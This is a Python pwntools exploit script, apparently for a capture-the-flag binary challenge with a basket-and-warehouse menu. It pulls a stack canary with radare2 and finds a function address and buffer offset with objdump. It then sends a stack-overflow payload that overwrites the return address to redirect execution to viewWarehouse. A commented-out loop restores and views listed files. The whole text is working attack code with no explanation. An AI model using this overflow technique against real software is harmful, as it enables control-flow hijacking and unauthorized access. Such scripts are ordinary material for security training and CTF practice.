from pwn import *
import r2pipe
import subprocess
from time import sleep

def create_basket(payload):
    io.sendlineafter(">> ",'1')
    io.sendlineafter("basket : ",payload)

def restore(filename):
    io.sendlineafter(">> ",'6')
    io.sendlineafter("tag : ",filename)

def viewBasket():
    io.sendlineafter(">> ",'2')


io=process("./bin{}".format(sys.argv[1]))
r = r2pipe.open("./bin{}".format(sys.argv[1]))
r.cmd('aaaaaa')
canary = int(r.cmd("pf S @obj.canary").split()[-1],16)

proc = subprocess.Popen(["objdump -M intel -d bin{} | grep '<viewWarehouse>'".format(sys.argv[1])], stdout=subprocess.PIPE ,shell = True)
(out ,err) = proc.communicate()
view_warehouse = int(out[:16],16)
log.info("ViewWarehouse = " + hex(view_warehouse))

proc = subprocess.Popen(["objdump -M intel -d bin{} | grep 'esi'".format(sys.argv[1])], stdout=subprocess.PIPE , shell = True)
offset = int(proc.stdout.readlines()[7].split()[-1].strip(",")[4:],16)
log.info("offset = " + hex(offset))

create_basket('a'*(offset-0x10) + p64(canary) + p64(view_warehouse))
io.sendlineafter(">> ",'2')
'''
io.recvuntil("Invalid!!\n")
io.recvuntil("Choice >> ")
io.recvuntil("baskets:")
f = io.recvuntil("-")
files = f.splitlines()
print files
for i in range(len(files)):
    log.info(files[i])
    restore(files[i])
    viewBasket()
'''
io.close()

